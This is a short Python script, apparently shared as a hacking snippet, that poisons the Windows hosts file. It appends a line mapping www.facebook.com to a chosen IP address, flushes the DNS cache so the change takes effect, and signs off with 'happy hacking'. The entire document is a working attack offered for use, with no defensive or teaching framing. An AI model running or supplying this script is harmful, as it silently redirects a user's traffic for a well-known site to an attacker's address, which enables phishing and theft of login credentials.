

# this is simple pythen code , can alter the DNS host file is windows operating system
# Can result in false ip-domain mapping or poisons the dns records.


import subprocess
import sys

import os

# command changes the directory of the system
os.chdir("C:\Windows\System32\drivers\etc") 
# write the false dns entries here in the hosts.conf file 

command = "echo 10.123.223.212 www.facebook.com >> hosts"  # command to alter the dns entries/ writing the entries to the file



CMD = subprocess.Popen(command, shell=True , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

command = "ipconfig /flushdns" # flushes the original dns entries 

CMD = subprocess.Popen(command, shell=True , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

# end of attack  
# happy hacking 
